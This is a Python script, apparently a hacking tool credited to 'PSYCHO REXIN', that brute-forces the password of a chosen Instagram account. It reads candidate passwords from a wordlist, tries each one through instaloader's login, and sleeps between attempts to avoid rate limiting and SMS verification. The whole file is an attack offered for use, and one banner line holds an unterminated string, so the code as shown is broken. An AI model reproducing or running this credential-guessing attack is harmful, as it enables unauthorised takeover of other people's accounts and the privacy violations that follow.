import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
from intro import *

class bcolors:
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[95m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'
start()
codeList = ["TR", "US-C", "US", "US-W", "CA", "CA-W",
            "FR", "DE", "NL", "NO", "RO", "CH", "GB", "HK"]
L = instaloader.Instaloader()
veri_break = "no"

while True:
    if veri_break == "si":
        break
    USER = ""
    USER = input('\033[1m\033[92m\n[?]ENTER INSTAGRAM USERNAME FOR CRACK PASSWORD: ')
    wl = input("\n[?]Enter the PassList along The Path: ")
    sleepp = int(input("\033[1m\033[91m\n[!]Type the sleep time for login(sec) (Rec:900): "))
    while True:
        sub.call("clear")
        procedere = input("\033[96m[•]Username to bruteforce = "+bcolors.BOLD+USER+"\n\n\033[96m[•]Wordlist = "+wl+"\n\nSleep time = "+str(sleepp)+bcolors.BOLD+"\n\033[91m[!] ConFirm  (y/n): "+bcolors.ENDC)
        if procedere == "y":
            veri_break = "si"
            break

        elif procedere == "n":
            exit()
        else:
            pass



file1 = open(wl, 'r')
Lines = file1.readlines()
count = 0
os.system("clear")
print("\t  \033[93m.
print("\t 8888888b.  Y88b   d88P  888b     888  \t")
print("\t 888   Y88b  Y88b d88P   8888b   888 \t")
print("\t 888    888   Y88o88P    88888b  888 \t")
print("\t 888   d88P    Y888P     888Y88b 888 \t")
print("\t 8888888P     d888b     888 Y88b888  \t")
print("\t 888 T88b     d88888b    888  Y88888 \t")
print("\t 888  T88b   d88P Y88b  888   Y8888  \t")
print("\t 888   T88b d88P   Y88b 888    Y888  \t") 
print("")                                                                                                                                             
print("\t \33[94m⊰᯽⊱┈──╌❊ CODED BY R3X1N ❊╌──┈⊰᯽⊱ \t")
print("")
print("\t  \033[36m┏━━━━━°❀•°:🎀 - 🎀:°•❀°━━━━━┓\t")
print("\n\t   \033[93m[#] \033[94mAUTHOR   :  \033[92mPSYCHO REXIN                                                          \t ")
print("\t  \033[93m [#] \033[94mGITHUB  : \033[92mgithub.com/PSYCHO-REXIN                                                         \t  ")
print("\t  \033[93m [#] \033[94mINSTA  : \033[92mpsycho_rexin_ofc_                                                         \t")
print("\t  \033[36m┗━━━━━°❀•°:🎀 - 🎀:°•❀°━━━━━┛\t")


for line in Lines:
    try:
        PASSWORD = ""
        count += 1
        pstest = ("{}".format(line.strip()))
        PASSWORD = pstest
        choiceCode = random.choice(codeList)
        time.sleep(1)
        print("\n\033[94mTrying "+pstest+"..."+bcolors.PURPLE)
        L.login(USER , PASSWORD)
        print("\n\033[36m[✓]Password found:  \033[92m"+pstest)

        break
    except instaloader.exceptions.BadCredentialsException:
        pass
        print(bcolors.FAIL+"\033[91mIncorret password: "+pstest)
        print("\033[93msleep for "+ str(sleepp))
        time.sleep(sleepp)

    except instaloader.exceptions.ConnectionException:
        print(bcolors.FAIL+"\n\033[6m[×]Instagram has been requested verification via sms, try to set more login time..."+bcolors.ENDC)
        break

    except instaloader.exceptions.InvalidArgumentException:
        print(bcolors.FAIL+"\nUsername not found"+bcolors.ENDC)